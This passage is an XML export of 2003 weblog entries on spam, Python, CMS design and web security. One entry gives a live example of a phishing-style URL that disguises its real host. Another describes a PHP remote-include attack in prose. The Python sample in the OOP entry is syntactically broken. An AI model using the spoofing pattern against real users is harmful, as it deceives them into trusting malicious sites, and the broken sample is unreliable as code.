&lt;p&gt;My advice is to use your common sense when analysing a potential spam protection technique. If you were a spammer, would you be able to outwit the method? Spammers aren't always very smart, but the people who write spamming tools (and get paid big bucks for them) are. Also remember to think about the payoff - unencoding a bunch of entities is a cheap operation. Embedding a Javascript interpreter to decipher email addresses that are glued together using Javascript at the last possible moment is a lot harder and could slow down a tool, so it may not be worth the effort.&lt;/p&gt;

&lt;p&gt;I'm still pretty confident in my own anti-spam harvester technique of &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/11/newFormOfSpamProtection&quot; title=&quot;New form of spam protection&quot;&gt;hiding my email address behind a POST form&lt;/a&gt;, but even that could eventually be outsmarted by a really dedicated harvesting tool.&lt;/p&gt;</field>
		<field name="created">2003-12-02 03:16:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1293</field>
		<field name="title">Downloading your hotmail inbox</field>
		<field name="slug">gotmail</field>
		<field name="body">&lt;p&gt;Adrian just pointed me to a fantastic tool: &lt;a href=&quot;http://www.nongnu.org/gotmail/&quot;&gt;Gotmail&lt;/a&gt;, a utility to download mail from Hotmail accounts. It's a command line utitlity, written in Perl and making use of the curl binary, which can connect to Hotmail over the web and grab any new emails, saving them locally as an mbox file and deleting them from the Hotmail server.&lt;/p&gt;

&lt;p&gt;Naturally, anything like this is completely dependent on Hotmail's design staying the same and maintaining the tool is a constant arms race. At the moment, Hotmail is ahead - a recent upgrade to the Hotmail design (some time in the last few days) has rendered Gotmail useless. A &lt;a href=&quot;http://mail.gnu.org/archive/html/gotmail-list/2003-10/msg00011.html&quot;&gt;call for help&lt;/a&gt; on the Gotmail mailing list from the lead developer makes particularly interesting reading. He's looking for developers and users who can help with the debugging effort required to get the tool working again, but the last paragraph of the email really caught my attention:&lt;/p&gt;

&lt;blockquote cite=&quot;http://mail.gnu.org/archive/html/gotmail-list/2003-10/msg00011.html&quot;&gt;&lt;p&gt;
Developers: If you have some Python proficiency, and would like to
assist in developing the next generation of Gotmail (development
name: gotfemail), email me off-list. I have some pretty ambitious
plans for this project, and depending on how much is actually
implemented, Hotmail breakages should be either self-fixing or very
simple to fix.  I've done some work on making a generic library for
this sort of job (so the fetchyahoo people and others might be
interested), and some preliminary work on embedding the Javascript
interpreter from the Mozilla project.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;A self-fixing screen scraper sounds like one heck of an interesting project, and I can't complain about the choice of development language either ;) If you're a Python hacker looking for a new project this could be well worth checking out.&lt;/p&gt;</field>
		<field name="created">2003-12-02 03:24:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1294</field>
		<field name="title">Extracting the length from MP3 files with Python</field>
		<field name="slug">mp3lengths</field>
		<field name="body">&lt;p&gt;Ned Batchelder &lt;a href=&quot;http://www.nedbatchelder.com/blog/200311.html#e20031102T135849&quot; title=&quot;Reading mp3 metadata&quot;&gt;recently wrote&lt;/a&gt; about the difficulties involved in extracting the length from an MP3 file. We're going to need to solve this problem soon at work; luckily, it seems that the answer may lie in the Python bindings for &lt;a href=&quot;http://www.mpgedit.org/mpgedit/&quot;&gt;mpgedit&lt;/a&gt;, an audio file editing library available for both Windows and Linux.&lt;/p&gt;

&lt;p&gt;After installing the &lt;a href=&quot;http://www.mpgedit.org/mpgedit/download_sdks.html&quot;&gt;Windows package&lt;/a&gt; and experimenting for a while, I managed to extract the time from one of my test files using the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import mpgedit
&amp;gt;&amp;gt;&amp;gt; play = mpgedit.Play('example.mp3')
&amp;gt;&amp;gt;&amp;gt; play.total_time()
(213, 129)
&amp;gt;&amp;gt;&amp;gt; secs, msecs = play.total_time()
&amp;gt;&amp;gt;&amp;gt; mins = secs / 60
&amp;gt;&amp;gt;&amp;gt; secs = secs - mins * 60
&amp;gt;&amp;gt;&amp;gt; print &quot;%d:%02d minutes&quot; % (mins, secs)
3:33 minutes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, for other files &lt;code class=&quot;python&quot;&gt;total_time()&lt;/code&gt; is returning &lt;code class=&quot;python&quot;&gt;(-1, -1)&lt;/code&gt;. I'm sure there's a solution to this but I haven't stumbled across it yet.&lt;/p&gt;
</field>
		<field name="created">2003-12-04 02:20:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1295</field>
		<field name="title">Dates on the web</field>
		<field name="slug">dates</field>
		<field name="body">&lt;p&gt;D. Keith Robinson writes about &lt;a href=&quot;http://www.7nights.com/asterisk/archives/using_dates_for_featured_web_content.php&quot;&gt;Using Dates For Featured Web Content&lt;/a&gt;. Keith's right, including a date with your content really is a no-brainer. I'll add an anecdote of my own. Several years ago I ran a popular news site for Team Fortress Classic, a team based online first person shooter game with a thriving clan scene. I was careful to include dates on every piece of content, but in my youthful naivety I neglected to include the year. The years rolled by and the content built up until I suddenly realised that I was no longer sure what year some of it was written in! The site has sadly now passed in to history but the lesson remains: the web moves faster than you might think, so omitting the year in your dates is a pretty dumb thing to do.&lt;/p&gt;

&lt;p&gt;It's pretty obvious but I'll point out anyway that using dd/mm/yyyy or mm/dd/yyyy for dates on sites is a bad idea as well. Us crazy brits use the former, them crazy yanks use the latter and everyone ends up thoroughly confused about any written date before the 13th of the month. I personally like to use the full &quot;4th December 2003&quot; format, but when space is limited the least ambiguous format is &lt;acronym title=&quot;International Organization for Standardization&quot;&gt;ISO&lt;/acronym&gt; standard YYYY-MM-DD.&lt;/p&gt;</field>
		<field name="created">2003-12-04 02:31:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1296</field>
		<field name="title">GAWDS now inviting new members</field>
		<field name="slug">gawds</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.gawds.org/&quot;&gt;Guild of Accessible Web Designers&lt;/a&gt; is &lt;q cite=&quot;http://www.gawds.org/showlog.php?weblogid=15&quot;&gt;a world wide organisation of web designers and developers committed to helping each other, and promoting the message that accessible web design is 'good for business'&lt;/q&gt;. I'd describe the organisation in detail here, but the official site &lt;a href=&quot;http://www.gawds.org/showlog.php?weblogid=15&quot; title=&quot;We are open for business&quot;&gt;does a far better job&lt;/a&gt; than I could. If you've been following the web accessibility community in any detail You're likely to recognise a number of the names on the &lt;a href=&quot;http://www.gawds.org/listmembers.php&quot;&gt;registered members&lt;/a&gt; list; I've been following &lt;acronym title=&quot;Guild of Accessible Web Designers&quot;&gt;GAWDS&lt;/acronym&gt; developments for a while and its shaping up to be a great resource for accessibility minded designers. I've also contributed an article on &lt;a href=&quot;http://www.gawds.org/show.php?contentid=28&quot;&gt;Writing good ALT text&lt;/a&gt; which hopefully provides some useful advice on a frequently misunderstood topic.&lt;/p&gt;</field>
		<field name="created">2003-12-04 02:55:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1297</field>
		<field name="title">Simpler content managment</field>
		<field name="slug">simple</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.smh.com.au/articles/2003/12/01/1070127346271.html&quot;&gt;Perls of wisdom in a sea of site mismanagement&lt;/a&gt;, via the ever-excellent &lt;a href=&quot;http://www.steptwo.com.au/columntwo/archives/001013.html#001013&quot; title=&quot;Perls of wisdom in a sea of site mismanagement&quot;&gt;Column Two&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.smh.com.au/articles/2003/12/01/1070127346271.html&quot;&gt;
&lt;p&gt;The great surprise of the past five years of content management is that, despite all the hundreds of systems, no clear winners have emerged. Instead, there's a growing dissatisfaction with the ongoing technical burden that such systems impose.&lt;/p&gt;

&lt;p&gt;Some influential voices are starting to argue that many sites should, in effect, wait out this immature phase of website management. For the moment, they should content themselves with limited automation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The article concludes with the idea that many sites can do perfectly well with a few simple Perl scripts and maybe a relational database on the back end, rather than investing in an expensive super-package that claims to be able to do anything you could possibly want. This is very sound advice. The simple fact of the matter is that many sites really don't need a complex content management platform with support for templating, user logins, workflow, versioning and a dozen other high end features. Most sites just need someone to be able to easily update them, when necessary. This is why Macromedia Contribute has been such a success - people want the ability to hit &quot;Edit This Page&quot;, make a few changes and publish straight to their site.&lt;/p&gt;

&lt;p&gt;I've worked on my fair share of content management systems (in fact I'm helping develop one at the moment) and out of all of the ones I've been involved in, the one I got the biggest kick out of took the shortest time to develop. It was based on &lt;a href=&quot;http://tavi.sourceforge.net/&quot;&gt;Tavi Wiki&lt;/a&gt;, and consisted of a password protected Tavi install for the back end and a slightly modified separate install for the front end. Both installs pointed to the same database, but the front end was altered to disable all editing features and make the site look less like a Wiki. You can see the end result &lt;a href=&quot;http://simon.incutio.com/uni/scheme/&quot; title=&quot;Home Page - Scheme&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;All in all, the &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; took less than an hour to put together from start to finish. It made it easy enough for contributors with no previous knowledge of HTML to update the site (using Wiki markup) and provided us with full versioning on all content contained within the project. The final site gives very few clues that the underlying engine is a Wiki, and thanks to Tavi's ease of customisation the site design can be easily changed to look even less wiki-like. It's close to the simplest thing that could possibly work and it works just fine.&lt;/p&gt;

&lt;p&gt;Of course, if you don't have a competent server-side programmer to hand your only option is to buy a pre-made solution, but with a half-decent programmer and a good set of tools a simple home built &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; customised to fit your needs could be a much better investment than some $100,000 one-size-fits all monstrosity.&lt;/p&gt;</field>
		<field name="created">2003-12-05 01:36:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1298</field>
		<field name="title">New PHP community site</field>
		<field name="slug">phpCommunitySite</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://dev.r.tucows.com/blog/_archives/2003/12/4/8091.html&quot;&gt;The Farm&lt;/a&gt;, Chris Shiflett is &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/4017&quot; title=&quot;PHP Community Site&quot;&gt;calling for assistance&lt;/a&gt; in setting up a new &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; community site to run along similar lines to &lt;a href=&quot;http://use.perl.org/&quot;&gt;use Perl&lt;/a&gt;. Chris has already secured an offer of hosting and support from O'Reilly and is now seeking offers of help from potential contributers. &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; has long needed a site of this kind (&lt;a href=&quot;http://www.phpbuilder.com/&quot;&gt;PHP Builder&lt;/a&gt; has lost a lot of momentum since being sold by Tim Perdue) so this could be a worth while project to get involved with if you have the time.&lt;/p&gt;

&lt;p&gt;I wonder if Python would benefit from something like this? Python already has an excellent decentralised community centered mainly around the Python newsgroups, blogs and mailing lists, but it would be nice if &lt;a href=&quot;http://www.python.org/&quot;&gt;Python.org&lt;/a&gt; provided more community oriented features.&lt;/p&gt;</field>
		<field name="created">2003-12-05 02:22:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1299</field>
		<field name="title">Bounty Hunting</field>
		<field name="slug">bountyHunting</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.python.org/~jeremy/weblog/031203.html&quot; title=&quot;Python Bounties&quot;&gt;Jeremy Hylton&lt;/a&gt;, Mark Shuttleworth (super-rich geek and &lt;a href=&quot;http://www.firstafricaninspace.com/&quot; title=&quot;The First African in Space project&quot;&gt;space tourist&lt;/a&gt;) is &lt;a href=&quot;http://www.markshuttleworth.com/bounty.html&quot; title=&quot;Here be bounties&quot;&gt;offering $100,000 worth of bounties&lt;/a&gt; in 2004 to developers willing to help out with a number of Open Source projects, most of which are to be developed in Python. A comparison can be made here with Mitch Kapor, another geek-done-well who funds open source development through his sponsorship of the &lt;a href=&quot;http://www.osafoundation.org/&quot;&gt;Open Source Applications Foundation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Personally I think this is a great way of funding open source development, although a counter-argument is that this kind of reward could encourage the wrong kind of attitude within the open source community with programmers dedicating their time to paid projects at the expense of others. I don't see this happening - people work on open source projects for the love of doing so and to scratch an itch. If you have the money to spend and want to offer it up as a bounty for someone to further develop a product you like then more power to you! I would certainly consider doing so if some freak incident left me rolling in cash (very unlikely to happen considering my complete disinterest in nursing my finances).&lt;/p&gt;</field>
		<field name="created">2003-12-05 02:48:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1300</field>
		<field name="title">How not to use OOP</field>
		<field name="slug">dataDriven</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://zephyrfalcon.org/weblog/arch_d7_2003_11_29.html#e427&quot; title=&quot;De kritiek van Hans&quot;&gt;Hans Nowak&lt;/a&gt;, &lt;a href=&quot;http://csis.pace.edu/~bergin/patterns/ppoop.html&quot;&gt;Understanding Object Oriented Programming&lt;/a&gt;, or how to turn 19 lines of easily maintained code in to an &lt;acronym title=&quot;Object Oriented&quot;&gt;OO&lt;/acronym&gt; monstrosity spanning 7 class files. This is not the way to make code more maintainable. For comparison, here's how I would implement a solution to the same problem in Python, assuming the availability of an equivalent function to Java's &lt;code class=&quot;java&quot;&gt;System.getProperty(&quot;os.name&quot;)&lt;/code&gt; (&lt;code class=&quot;python&quot;&gt;os.name&lt;/code&gt; is similar but inappropriate for this example):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;MESSAGES = (
  ('SunOS', 'Linux'), 'This is a UNIX box and therefore good.'),
  ('Windows NT', Windows 95'), 'This is a Windows box and therefore bad.),
)
DEFAULT_MESSAGE = 'This is not a box.'

def get_os():
    name = System.getProperty(&quot;os.name&quot;)
    for names, message in MESSAGES:
        if name in names:
            return message
    return DEFAULT_MESSAGE

if __name__ == &quot;__main__&quot;:
    print get_os()	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In my book, smart data-driven programming beats over-engineered class-based programming any day of the week.&lt;/p&gt;</field>
		<field name="created">2003-12-05 23:10:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1301</field>
		<field name="title">Hacked for Spam</field>
		<field name="slug">hackedForSpam</field>
		<field name="body">&lt;p&gt;From the &lt;a href=&quot;http://www.nytimes.com/2003/12/08/technology/08trojan.html?ex=1386219600&amp;amp;en=fc2a920c196b88ca&amp;amp;ei=5007&amp;amp;partner=USERLAND&quot; title=&quot;Hackers Steal From Pirates, to No Good End&quot;&gt;New York Times&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.nytimes.com/2003/12/08/technology/08trojan.html?ex=1386219600&amp;amp;en=fc2a920c196b88ca&amp;amp;ei=5007&amp;amp;partner=USERLAND&quot;&gt;
&lt;p&gt;Computer security researchers have been watching the evolution of remote-access rogue programs as they have become more common and have put more machines under the control of hackers. Programs like Sinit infect target machines and surreptitiously open back doors that allow outsiders to control the PC's. The rings of infected computers have been used to send spam, to present online advertisements for pornographic Web sites or to trick people into giving up information like credit card numbers.&lt;/p&gt;

&lt;p&gt;In fact, &lt;em&gt;at least a third of all spam circulating on the Internet is now sent from or relayed by personal home computers that have been taken over&lt;/em&gt;, said Jesse Dougherty, director of development at Sophos, an antivirus and antispam company. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Emphasis mine. Of course, whether or not you want to believe a director from a company that directly profits from people's fear of security attacks is up to you. That said, I've seen plenty of supporting evidence in the past few months that indicates that spamming is now the number one reason that a cracker would want to take over a &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt;, not least &lt;a href=&quot;http://www.wired.com/news/business/0,1367,60747,00.html&quot; title=&quot;Cloaking Device Made for Spammers&quot;&gt;this Wired article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Continuing on the same theme, &lt;a href=&quot;http://www.securityfocus.com/guest/24043&quot;&gt;The Rise of the Spammers&lt;/a&gt; is a fascinating article by David Barroso Berrueta describing how one of his servers was turned in to a spam relay after being compromised through a vulnerability in a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script. The technical details are intriguing; the attacker downloaded and uncompressed a daemon which then communicated with another host using an extended version of the &lt;acronym title=&quot;Simple Mail Transfer Protocol&quot;&gt;SMTP&lt;/acronym&gt; protocol, receiving spam email bodies along with lists of addresses to send the spam on to.&lt;/p&gt;

&lt;p&gt;Let's talk about the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; vulnerability in question: yet again, it was the classic problem where an attacker can instruct &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; to download and execute code from their own server by feeding in a query string parameter that is passed un-checked to an &lt;code class=&quot;php&quot;&gt;include()&lt;/code&gt; function call. While there are a number of steps that can be taken to deny this kind of attack, it unveils a fundamental problem with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; itself - that it will execute code retrieved from a &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt; in the first place! This feature should be removed from &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; - it has almost no purpose in the real world aside from allowing servers to be cracked in to. The feature exists because &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; has the extremely useful ability to &lt;a href=&quot;http://www.php.net/manual/en/features.remote-files.php&quot;&gt;open remote files over HTTP&lt;/a&gt;. Unfortunately, this feature extends to the &lt;code class=&quot;php&quot;&gt;include()&lt;/code&gt; and &lt;code class=&quot;php&quot;&gt;require()&lt;/code&gt; functions which will execute any &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; code in the file passed to the functions. The most obvious solution to my mind would be for these functions to refuse to execute &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; in files that were opened via &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt;. I have no doubt that this would involve an ugly hack on behalf of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s maintainers, but I believe the number of security problems it would solve would be well worth the trade-off.&lt;/p&gt;

&lt;p&gt;Incidentally, I &lt;em&gt;know&lt;/em&gt; you can &lt;a href=&quot;http://us4.php.net/manual/en/install.configure.php#install.configure.disable-url-fopen-wrapper&quot;&gt;disable opening files over HTTP&lt;/a&gt; and I &lt;em&gt;know&lt;/em&gt; you shouldnt allow the direct creation of variables from the query string in the first place. The problems here are two-fold: firstly, opening files over &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; is actually a very useful feature, one that would be all the more useful if it didn't carry the risk of executing arbitrary code. Secondly, the problem is mainly down to third party software which often requires insecure &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; settings (such as register_globals) in order to work.&lt;/p&gt;</field>
		<field name="created">2003-12-09 02:56:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1302</field>
		<field name="title">YAGNI and DRY</field>
		<field name="slug">yagniAndDry</field>
		<field name="body">&lt;p&gt;Two acronyms that have been seeing a lot of action at work recently are &lt;acronym title=&quot;You Ain&amp;apos;t Gonna Need It&quot;&gt;YAGNI&lt;/acronym&gt; and &lt;acronym title=&quot;Don&amp;apos;t Repeat Yourself&quot;&gt;DRY&lt;/acronym&gt;. They're great principles to go by in any case, but in a pair programming environment they take on a whole new level of utility.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://xp.c2.com/YouArentGonnaNeedIt.html&quot;&gt;You Ain't Gonna Need It&lt;/a&gt; states that you should &lt;q cite=&quot;http://xp.c2.com/YouArentGonnaNeedIt.html&quot;&gt;always implement things when you &lt;strong&gt;actually&lt;/strong&gt; need them, never when you just &lt;strong&gt;foresee&lt;/strong&gt; that you need them.&lt;/q&gt; This is great for controlling feature creep; the moment one of us says &quot;we might need that later&quot; the other says &quot;YAGNI&quot; and we can move right along.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.pragmaticprogrammer.com/ppbook/extracts/rule_list.html&quot;&gt;Don't Repeat Yourself&lt;/a&gt; is one of the tips from &lt;a href=&quot;http://www.pragmaticprogrammer.com/&quot;&gt;The Pragmatic Programmer&lt;/a&gt;, a book which is every bit as good as &lt;a href=&quot;http://www.google.com/search?q=pragmatic+programmer+review&quot; title=&quot;Google Search: pragmatic programmer review&quot;&gt;people say it is&lt;/a&gt;. It states that &lt;q cite=&quot;http://www.pragmaticprogrammer.com/ppbook/extracts/rule_list.html&quot;&gt;Every piece of knowledge must have a single, unambiguous, authoritative representation within a system&lt;/q&gt; - whenever we spot something that is duplicated and can be considered a &quot;piece of knowledge&quot; we frequently refactor it straight away.&lt;/p&gt;

&lt;p&gt;One of the most interesting things about pair programming is that introduces a complete reliance on communication in to something that it generally a solitary activity. Guidelines like the two listed above extend the vocabulary that can be used in such communication, speeding up development and making tough decisions easier to quickly resolve.&lt;/p&gt;</field>
		<field name="created">2003-12-09 03:12:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1303</field>
		<field name="title">Nasty new IE vulnerability</field>
		<field name="slug">nastyBug</field>
		<field name="body">&lt;p&gt;Most people reading are probably aware of the common trick whereby spammers and other assorted ne'er-do-wells publish &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s with &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=122445&quot; title=&quot;Spoof prevention: Warn if username/password in link (url) looks like a hostname&quot;&gt;usernames that look like hostnames&lt;/a&gt; to fool people in to trusting a malicious site - for example, &lt;a href=&quot;http://www.microsoft.com&amp;amp;session%123123123@simon.incutio.com&quot;&gt;http://www.microsoft.com&amp;amp;session%123123123@simon.incutio.com&lt;/a&gt;. This trick is frequently used by spammers to steal people's PayPal accounts, by tricking them in to &quot;resetting&quot; their password at a site owned by the spammer but disguised as PayPal.com.&lt;/p&gt;

&lt;p&gt;Today's &lt;a href=&quot;http://www.zapthedingbat.com/security/ex01/vun1.htm&quot;&gt;new Internet Explorer vulnerability&lt;/a&gt; makes the problem a hundred times worse. By including an 0x01 character after the @ symbol in the fake &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; can be tricked in to not displaying the rest of the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; &lt;em&gt;at all&lt;/em&gt;. Don't expect a patch for a while either; the guy who discovered the bug &lt;a href=&quot;http://www.securityfocus.com/archive/1/346948&quot;&gt;released it to BugTraq&lt;/a&gt; on the same day he notified the vendor.&lt;/p&gt;</field>
		<field name="created">2003-12-09 19:21:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1304</field>
		<field name="title">Implementing filesystems in Python</field>
		<field name="slug">pythonFilesystems</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.freenet.org.nz/python/lufs-python/&quot;&gt;LUFS-Python&lt;/a&gt; provides a relatively simple &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; for implementing new Linux filesystems in pure Python. You install the package, write a class implementing methods for handling filesystem operations such as creating a directory, opening/reading/writing/closing a file, creating symlinks etc and finally mount your new filesystem with some special arguments to the mount command.&lt;/p&gt;

&lt;p&gt;At first glance, this is a bit of a gimmick - why would you want to write your own filesystem in the first place? We've been talking about this at work and came up with a few ideas. How about a filesystem where &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; files saved in a certain directory were instantly run through &lt;a href=&quot;http://tidy.sourceforge.net/&quot;&gt;HTMLTidy&lt;/a&gt; and converted in to valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; ? Or a custom network filesystem that saves files on a remote server using &lt;a href=&quot;http://www.gnupg.org/&quot; title=&quot;GNU Privacy Guard&quot;&gt;GnuPG&lt;/a&gt; to encrypt them before transfer? How about a read-only filesystem that lets you browse the contents of a MySQL database? Just imagine being able to use tools such as &lt;code&gt;grep&lt;/code&gt; and &lt;code&gt;find&lt;/code&gt; to search your database. A module that maps someone elses public web server to your own filesystem, making mirroring as easy as running a recursive &lt;code&gt;cp&lt;/code&gt; command. A filesystem that updates a &lt;a href=&quot;http://swish-e.org/&quot;&gt;swish-e&lt;/a&gt; full-text index every time a file is saved to it - years before Microsoft release Longhorn. The possibilities are endless.&lt;/p&gt;

&lt;p&gt;Here's a really fun idea: a filesystem that implements a dynamic website. Instead of using tools like mod_python to dynamically create pages, implement a filesystem that dynamically creates &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; files as they are requested and set up a stock Apache install with the dynamic filesystem as the document root. Then point &lt;a href=&quot;http://proftpd.linux.co.uk/&quot;&gt;ProFTPD&lt;/a&gt; at it so you can log in via &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; and mess with your content dynamically. We're thinking about bulding an &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; interface to our new database driven &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;, but we could just build a filesystem interface and point our &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; server straight at it.&lt;/p&gt;

&lt;p&gt;I'm sure there are performance and stability issues that make most of the above more trouble than it's worth, but I think you'll agree it's a pretty exciting technology.&lt;/p&gt;</field>
		<field name="created">2003-12-10 23:30:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1305</field>
		<field name="title">More blogmark tweaks</field>
		<field name="slug">blogmarkComments</field>
		<field name="body">&lt;p&gt;I'm up to 110 &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;blogmarks&lt;/a&gt; now, and from my point of view they're the single most useful feature I've added to this site in a long time. I've modified my &lt;a href=&quot;http://simon.incutio.com/archive/2003/12/10/&quot; title=&quot;Simon Willison: Archive for 10th December 2003&quot;&gt;day archive pages&lt;/a&gt; to show the blogmarks added on that day, and I'm considering adding them to individual entry pages as well so that an entry is displayed along with the blogmarks added while that entry was at the top of my blog. The idea there is that I could aim to blogmark &quot;related items&quot; for the top entry, although obviously unrelated sites would end up in there as well.&lt;/p&gt;

&lt;p&gt;The other thing I'm currently mulling over is whether or not blogmarks should allow comments. &lt;a href=&quot;http://www.kottke.org/&quot;&gt;Jason Kottke's&lt;/a&gt; inline links get a decent amount of comment traffic but I'm not sure mine would get enough individual traffic to warrant a comments thread for each one. I could always add comments to the &lt;a href=&quot;http://simon.incutio.com/blogmarks/2003/12/10/&quot; title=&quot;Blogmarks for 10th December 2003&quot;&gt;blogmark daily archive pages&lt;/a&gt;, although that could get confusing on days with a lot of comment-worthy links.&lt;/p&gt;

&lt;p&gt;Does anyone actually look at the blogmarks? Would you comment on them or read the comments if they were available?&lt;/p&gt;</field>
		<field name="created">2003-12-11 00:28:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1306</field>
		<field name="title">My first SitePoint article</field>
		<field name="slug">sitepoint</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.sitepoint.com/article/1259&quot;&gt;Enhancing Structural Markup with JavaScript&lt;/a&gt; is my first published article for &lt;a href=&quot;http://www.sitepoint.com/&quot;&gt;SitePoint&lt;/a&gt;, a web development portal that is also home to some of the &lt;a href=&quot;http://www.sitepointforums.com/&quot; title=&quot;SitePoint Forums&quot;&gt;best web design forums&lt;/a&gt; on the web. I've been a big fan of SitePoint for a number of years and it's great to finally have contributed something to the site. The article discusses two methods of building useful Javascript effects on top of well structured markup and is based on my &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/06/easytoggle&quot; title=&quot;easytoggle and debugging in Safari&quot;&gt;easytoggle&lt;/a&gt; and &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/blockquoteCitations&quot;&gt;blockquote citations&lt;/a&gt; experiments, both previously featured on this blog.&lt;/p&gt;

&lt;p&gt;Associated trivia: The dopey looking photograph the accompanies my profile was taken outside a youth hostel in Amsterdam earlier this year.&lt;/p&gt;

</field>
		<field name="created">2003-12-11 02:03:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1307</field>
		<field name="title">Static content generation</field>
		<field name="slug">staticContentGeneration</field>
		<field name="body">&lt;p&gt;Ian Bicking has an interesting pieces on &lt;a href=&quot;http://blog.colorstudy.com/ianb/weblog/2003/12/12.html#P45&quot; title=&quot;CMS and static publishing&quot;&gt;using static publishing&lt;/a&gt; in a &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;. The choice between static and dynamic when building software for the web is a critical one, and one that I think deserves in-depth discussion.&lt;/p&gt;

&lt;p&gt;In a dynamic site, pages are assembled &quot;on the fly&quot; as and when they are requested. Most &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; powered sites do this and as &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; as a technology actively encourages dynamic content creation. Generating pages dynamically allows for all sorts of clever applications, from &lt;a href=&quot;http://www.natbat.co.uk/quotecode.php&quot;&gt;random quote generators&lt;/a&gt; to full on web applications such as Hotmail.&lt;/p&gt;

